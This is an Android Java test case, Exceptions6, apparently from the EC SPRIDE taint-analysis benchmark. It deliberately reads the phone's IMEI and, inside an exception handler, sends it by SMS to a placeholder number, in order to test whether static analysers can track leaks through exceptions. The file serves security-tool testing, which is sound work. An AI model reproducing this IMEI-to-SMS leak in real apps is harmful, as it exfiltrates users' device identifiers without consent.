package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.view.View;
import android.widget.Button;

/**
 * @testcase_name Exceptions6
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description An implicit exception containing tainted data is thrown inside a called method and caught in
 * the caller
 * @dataflow source -> imei -> exception -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle exception data across method calls
 */
public class Exceptions6 extends Activity {

	private String imei = "";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_exceptions4);

		ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);

		((Button) findViewById(R.id.trigger)).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				try {
					callMe();
				} catch (RuntimeException ex) {
					SmsManager sm = SmsManager.getDefault();
					sm.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
				}
			}
		});
	}

	private void callMe() {
		TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		imei = telephonyManager.getDeviceId(); //source
		String[] arr = new String[42];
		System.out.println(arr[1337]);
	}

}
